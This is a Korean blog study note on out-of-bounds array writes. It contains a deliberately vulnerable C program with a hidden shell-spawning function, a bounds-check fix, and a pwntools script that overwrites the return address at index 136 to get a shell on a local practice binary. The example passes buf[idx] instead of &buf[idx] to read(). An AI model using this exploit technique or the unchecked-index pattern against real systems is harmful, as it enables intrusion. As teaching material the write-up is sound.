---
title: "[PWNABLE] Out Of Bounds"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ Out Of Bounds는 배열의 인덱스 값을 음수 혹은 배열의 크기를 벗어난 값을 입력했을 때 발생한다. 개발할 때 인덱스에 대한 검증 과정 코드만 넣어주면 방지가 가능하다. if (idx = 128) { printf(\"Invalid index!\\"
date: "2024-06-24"
translation_key: "tistory-58fe9a713fd6"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-Out-Of-Bounds"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다.** **※** 

Out Of Bounds는 배열의 인덱스 값을 음수 혹은 배열의 크기를 벗어난 값을 입력했을 때 발생한다.

개발할 때 인덱스에 대한 검증 과정 코드만 넣어주면 방지가 가능하다.

```
    if (idx < 0 || idx >= 128) {
        printf("Invalid index!\n");
        return;
    }
```

아래 예제를 가지고 살펴보도록 하겠다.

```
// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
#include <stdio.h>
#include <stdlib.h>

void gift() {
	printf("Hello! ZZoMblE");
	system("/bin/sh");
}
void initialize() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
}
void vuln() {
	char buf[128];
	int idx = 0;
	printf("input idx : ");
	scanf("%d", &idx);

	printf("input change value : ");
	read(0, buf[idx],0x10);

}
int main() {
	initialize();
	vuln();
	return 0;
}
```

이번에도 vuln()의 입력에서 취약점이 발생한다.

사용자가 원하는 인덱스 위치에 값을 0x10만큼 쓸 수가 있기 때문에 ret의 인덱스만 계산을 한다면 Return Address Overflow를 수행할 수 있다.

![](/assets/images/tistory/tistory-58fe9a713fd6/001.png)

idx에 0을 넣어준 상태이다.

ret와 buf는 136만큼 떨어져 있기 때문에, idx에 136을 입력하면 ret 위치에 overwrite가 가능하다는 것을 알아낼 수 있다.

ret에 그대로 gift()를 덮어쓰고 싶지만, 현재 상태에서는 스택 정렬이 맞지 않기 때문에 ret gadget을 하나 써주어 맞춰준다.

```
from pwn import *

target = b'./ex'

p = process(target)
e = ELF(target)

gift = e.sym['gift']
ret = 0x000000000040101a

payload = p64(ret)
payload += p64(gift)

p.sendlineafter(b': ',b'136')
p.sendafter(b':', payload)

p.interactive()
```

실행해보면 shell을 얻은 것을 확인할 수 있다.

![](/assets/images/tistory/tistory-58fe9a713fd6/002.png)
